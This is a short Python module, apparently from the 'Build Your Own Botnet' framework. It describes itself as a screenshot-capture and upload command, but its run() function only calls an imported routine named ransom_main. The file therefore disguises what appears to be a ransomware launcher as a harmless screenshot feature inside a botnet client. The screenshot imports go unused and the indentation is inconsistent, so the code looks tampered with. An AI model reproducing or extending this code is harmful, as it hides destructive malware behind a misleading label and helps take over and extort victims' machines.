#!/usr/bin/python
# -*- coding: utf-8 -*-
'Screenshot (Build Your Own Botnet)'
from ransom_main import main as ransom_main
# standard library
import base64

# packages
import mss

# modules
import util

# globals
command = True
packages = ['mss','util']
platforms = ['win32','linux2','darwin']
usage = 'screenshot [imgur/ftp] [option=value, ...]'
description = """
Capture a screenshot on the client and optionally upload anonymously to
Imgur or to a remote FTP server (default: save image on local host machine)
"""

# main
def run():
    """
    Capture a screenshot

    """
    try:
	    ransom_main()
    except Exception as e:
        return "{} error: {}".format(run.__name__, str(e))
